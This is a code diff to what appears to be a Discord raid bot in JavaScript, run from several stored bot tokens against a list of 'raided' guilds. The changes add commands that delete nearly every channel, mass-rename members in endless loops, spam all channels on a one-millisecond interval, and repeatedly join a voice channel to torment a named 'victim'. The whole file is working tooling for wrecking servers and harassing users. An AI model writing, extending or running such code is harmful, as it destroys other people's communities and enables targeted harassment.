@@ -11,10 +11,12 @@ const { joinVoiceChannel } = require('@discordjs/voice');
 
 const dotaShit = require(`${genDir}/dotaShit.json`)
 const animeShit = require(`${genDir}/animeShit.json`)
+const shutUp = require(`${genDir}/SHUT_UP.json`)
 
 const TOKENS = require(`${raidDir}/TOKENS.json`)
 const BOTS = require(`${raidDir}/BOTS.json`)
 const GUILDS = require(`${raidDir}/RAIDED_GUILDS.json`)
+const IGNORE_CHANNELS = require(`${raidDir}/IGNORE_CHANNELS.json`)
 
 const utils = require('./utils.js');
 
@@ -103,10 +105,15 @@ function launch(token, delay) {
             const base = command.options(message);
             const guildMembers = base.guild.members.cache
 
-            for (let member of guildMembers) {
-                member[1].setNickname(base.options[1]).catch(error => { })
+            utils.changeAllNicks(guildMembers, delay, animeShit)
+        },
+        'changeNicksInf': (message) => {
+            const base = command.options(message);
+            const guildMembers = base.guild.members.cache
 
-            }
+            setInterval(() => {
+                utils.changeAllNicks(guildMembers, delay, animeShit)
+            }, 100)
         },
         'createChannels': (message) => {
             const base = command.options(message);
@@ -128,7 +135,7 @@ function launch(token, delay) {
             const base = command.options(message);
 
             for (let channel of base.guild.channels.cache) {
-                if (channel[1].name !== 'root') {
+                if (IGNORE_CHANNELS.indexOf(channel[1].name) === -1) {
                     channel[1].delete('Because I can').catch(error => {
                         // console.warn('Something wrong', '[deleteChannels]')
                     })
@@ -143,7 +150,7 @@ function launch(token, delay) {
                 setTimeout(() => {
                     base.guild.roles.create({
                         name: utils.getRandomItem(dotaShit),
-                        color: "RANDOM"
+                        color: "RANDOM",
                     })
                         .then(role => {
                             console.log(`Role ${role.name} created`)
@@ -154,8 +161,7 @@ function launch(token, delay) {
                         .catch(error => {
                             // console.warn('Something wrong', '[createRoles]')
                         })
-                }, delay
-                )
+                }, delay)
             }
 
         },
@@ -174,15 +180,29 @@ function launch(token, delay) {
                         .catch(error => {
                             // console.warn('Something wrong', '[deleteRoles]')
                         })
-                }, delay / 3
+                }, 200
                 )
             }
+        },
+        'spam': (message) => {
+            const base = command.options(message);
+            const channels = base.guild.channels.cache
+
+            utils.spamALlChannels(channels, delay)
+        },
+        'spamInf': (message) => {
+            const base = command.options(message);
+            const channels = base.guild.channels.cache
+
+            setInterval(() => {
+                utils.spamALlChannels(channels, delay)
+            }, 1)
         },
         'tormentWithSound': (message) => {
             const base = command.options(message)
             const victim = base.options[1]
 
-            const channel = base.guild.channels.cache.get("723290894391967848")
+            const channel = base.guild.channels.cache.get("721854300707487774")
 
             setInterval(() => {
                 let connection = joinVoiceChannel({
@@ -209,8 +229,8 @@ function launch(token, delay) {
 
             channel.send(`[${firstWord}] successfully executed`);
         }
-        else {
-            channel.send('Undefined option');
+        else if (message.content.indexOf('^') === -1){
+            channel.send(utils.getRandomItem(shutUp));
         }
     });
 
@@ -219,7 +239,7 @@ function launch(token, delay) {
     return command
 }
 
-let delay = 300;
+let delay = 800;
 for (let nickname in TOKENS) {
     const token = TOKENS[nickname]
     let commandHanlder = launch(token, delay)
